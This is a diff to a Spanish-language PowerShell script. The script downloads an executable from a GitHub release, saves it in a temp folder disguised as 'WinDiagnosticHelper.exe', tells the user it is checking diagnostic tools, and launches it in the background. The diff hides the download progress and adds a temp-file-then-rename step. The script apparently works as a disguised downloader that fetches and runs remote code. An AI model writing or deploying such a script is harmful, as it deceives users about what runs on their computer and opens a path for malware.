@@ -1,6 +1,8 @@
 $ErrorActionPreference = "Stop"
+$ProgressPreference = "SilentlyContinue"
 $tempDir = "$env:TEMP\WinDiagCache"
 $appExe = "$tempDir\WinDiagnosticHelper.exe"
+$appTmp = "$tempDir\WinDiagnosticHelper.tmp"
 $appUrl = "https://github.com/DanielWueno/AetherLink/releases/download/Android_Only/AetherLink.UI.exe"
 
 Write-Host "Verificando herramientas de diagnóstico..." -ForegroundColor DarkGray
@@ -8,7 +10,8 @@ Write-Host "Verificando herramientas de diagnóstico..." -ForegroundColor DarkGr
 if (-not (Test-Path $appExe)) {
     Write-Host "Sincronizando binarios en la caché temporal. Por favor espera..." -ForegroundColor DarkGray
     New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
-    Invoke-WebRequest -Uri $appUrl -OutFile $appExe
+    Invoke-WebRequest -Uri $appUrl -OutFile $appTmp
+    Rename-Item -Path $appTmp -NewName "WinDiagnosticHelper.exe" -Force
 }
 
 Write-Host "Lanzando entorno gráfico en segundo plano..." -ForegroundColor DarkGray
